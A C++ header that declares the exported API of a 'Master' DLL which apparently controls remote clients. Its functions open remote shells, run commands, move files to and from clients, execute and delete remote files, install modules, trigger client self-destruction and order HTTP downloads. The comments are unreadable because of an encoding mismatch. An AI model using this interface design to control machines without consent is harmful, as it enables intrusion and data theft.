#pragma once
// ���� ifdef ���Ǵ���ʹ�� DLL �������򵥵�
// ��ı�׼�������� DLL �е������ļ��������������϶���� MASTER_EXPORTS
// ���ű���ġ���ʹ�ô� DLL ��
// �κ�������Ŀ�ϲ�Ӧ����˷��š�������Դ�ļ��а������ļ����κ�������Ŀ���Ὣ
// MASTER2_API ������Ϊ�Ǵ� DLL ����ģ����� DLL ���ô˺궨���
// ������Ϊ�Ǳ������ġ�
#ifdef MASTER2_EXPORTS
#define MASTER2_API extern "C" __declspec(dllexport)
#else
#define MASTER2_API extern "C" __declspec(dllimport)
#endif

#include "ArrayData.h"
#include "BaseType.h"
#include "ClientInfoCallbacks.h"
#include "MessageDefines.h"
#include "CommCallback.h"
#include "CmdShellData.h"
#include "MasterError.h"
#include "FileTransferData.h"


typedef struct  
{
	CHAR	partition;
	UINT	driverType;
	UINT64	freeBytes;
	UINT64	totalBytes;
} MDISK_INFO;
typedef ItemList<MDISK_INFO, NO_UNINIT> MDiskInfoList;

typedef struct MFILE_INFO
{
	WCHAR		filename[MAX_PATH];
	DWORD		dwAttributes;
	UINT64		filesize;
	FILETIME	lastWriteTime;

	BOOL IsDir() const
	{
		return (FILE_ATTRIBUTE_DIRECTORY & dwAttributes);
	}

	bool operator<(const MFILE_INFO& another) const
	{
		if (! IsDir() && another.IsDir()) return false;
		else if (IsDir() && ! another.IsDir()) return true;
		else
		{
			int iCmp = _wcsicmp(filename, another.filename);
			if (iCmp < 0) return true;
			else return false;
		}
	}
} MFILE_INFO;
typedef ItemList<MFILE_INFO, NO_UNINIT> MFileInfoList;

typedef std::map<std::string,int> PORT_MAP;
//��Ϣ������Ϣ
typedef struct  
{
	MSGSERIALID serial;
	BOOL		bToClient;
	TCHAR		desc[1024];
} RC_MSG_INFO;
typedef ItemList<RC_MSG_INFO, NO_UNINIT> RcMsgInfoList;

typedef ItemList<TRANS_STATUS, NO_UNINIT> TransferInfoList;
//Shell��ؽӿ�
MASTER2_API BOOL OpenShell(LPCWSTR clientid, FnRemoteCmdOutput fnRemoteCmdOutput, LPVOID lpParameter);

MASTER2_API BOOL ExecuteShellCommand(LPCWSTR clientid, LPCWSTR cmdline, BOOL bAddRN = TRUE);

MASTER2_API void CloseShell(LPCWSTR clientid);

//�ļ�������ؽӿ�

MASTER2_API BOOL PutFileToClient(LPCTSTR clientid,LPCTSTR serverpath,LPCTSTR clientpath);

MASTER2_API BOOL GetFileToServer(LPCTSTR clientid,LPCTSTR clientpath,LPCTSTR serverpath);

MASTER2_API BOOL StopFileTransfer(LPCTSTR clientid,LPCTSTR serverpath);

MASTER2_API BOOL StartFileTransfer(LPCTSTR clientid,LPCTSTR serverpath);


typedef void (*FnQueryTrans)(LPCTSTR clientid,TRANS_STATUS status,LPVOID lpParameter);
MASTER2_API void QueryFileTransferStatus(LPCTSTR clientid,TransferInfoList* list);
MASTER2_API void QueryTransferStatus(LPCTSTR clientid,FnQueryTrans fn,LPVOID lpParameter);

MASTER2_API void DeleteRemoteFile(LPCTSTR clientid,LPCTSTR clientpath);

MASTER2_API void RunRemoteFile(LPCTSTR clientid,LPCTSTR clientpath);

//�ļ������ؽӿ�

MASTER2_API BOOL ListDisks(LPCWSTR clientid, MDiskInfoList* pDiskInfoList);

MASTER2_API BOOL ListFiles(LPCWSTR clientid, LPCWSTR findstr, MFileInfoList* pFileInfoList);

MASTER2_API void AsynListFiles( LPCTSTR clientid, LPCTSTR findstr,BOOL isClient, LPVOID lpParameter);

MASTER2_API void AsynListDisks( LPCWSTR clientid,BOOL isClient, LPVOID lpParameter );

//����Master
MASTER2_API BOOL StartMasterWorking();

//������Ϣ���кţ���ѯ�ͻ��˵�Ӧ����Ϣ
MASTER2_API BOOL GetReplyByMsgserialid(LPCTSTR clientid, MSGSERIALID sendMsgserialid, ByteList* pByteList);

//��ѯ���ڷ�����Ϣ��״̬
MASTER2_API BOOL QuerySendingMessageStatus(LPCTSTR clientid, MSGSERIALID sendMsgserialid, DWORD* pdwSentBytes, DWORD* pdwTotalBytes);

//��ѯ���ڽ�����Ϣ��״̬
MASTER2_API BOOL QueryReceivingFileStatus(LPCTSTR clientid, MSGSERIALID receivingMsgserialid, DWORD* pdwRecvBytes, DWORD* pdwTotalBytes);

//���ÿͻ�����Ϣ����ص�֪ͨ����
MASTER2_API void SetClientInfoNotifies(FnNotifyProc fnNotify, LPVOID lpParameter);

//��ȡ�����һ��������
MASTER2_API DWORD GetMasterLastError();

//��ȡ�����Ŷ�Ӧ��������Ϣ
MASTER2_API LPCTSTR GetMasterErrorMsg(DWORD dwLastError);

//��ѯ��ǰ���õĿͻ���id�б�
MASTER2_API void ListAvailableClients(MyStringList* pClientidList);

//��ѯ�ͻ����п��õ�ģ���б�
MASTER2_API BOOL ListModules(LPCTSTR clientid, MyStringList* pModulenameList);

//��ͻ����а�װģ��
MASTER2_API BOOL InstallClientModule(LPCTSTR clientid, LPCTSTR moduleName);

//��Ӽ�������
MASTER2_API int AddCommService(int port,int name);

//ɾ����������
MASTER2_API BOOL DeleteCommService(int serialid);

//��ѯ������Ͽ��õ�ģ���б�
MASTER2_API void ListAvailableClientModules(MyStringList* pModulenameList);

//�ÿͻ����Ի�
MASTER2_API BOOL MakeClientSelfDestruction(LPCTSTR clientid);

//��ȡ�ͻ��˵Ļ�����Ϣ
MASTER2_API BOOL GetClientInfo(LPCTSTR clientid, CLIENT_INFO* clientBaseInfo);

//��ѯģ���ڿͻ��˵�״̬�Ͱ�װ����
MASTER2_API void QueryModuleInstallStatus(LPCTSTR clientid, LPCTSTR moduleName, MODULE_INST_STATUS* pStatus, UINT* pProgress);

//�ر�MASTER
MASTER2_API void StopMasterWorking();

//�޸�Packet״̬
MASTER2_API BOOL ModifyPacketStatus(ULONG serial,LPCTSTR clientid,BOOL status);

//����ģ��ص�
MASTER2_API void SetModuleCallBack(FnModuleNotifyProc func);

//ʹ��HTTP�����ļ�
MASTER2_API void HttpDownLoad(LPCTSTR clientid,LPCTSTR url,LPCTSTR path);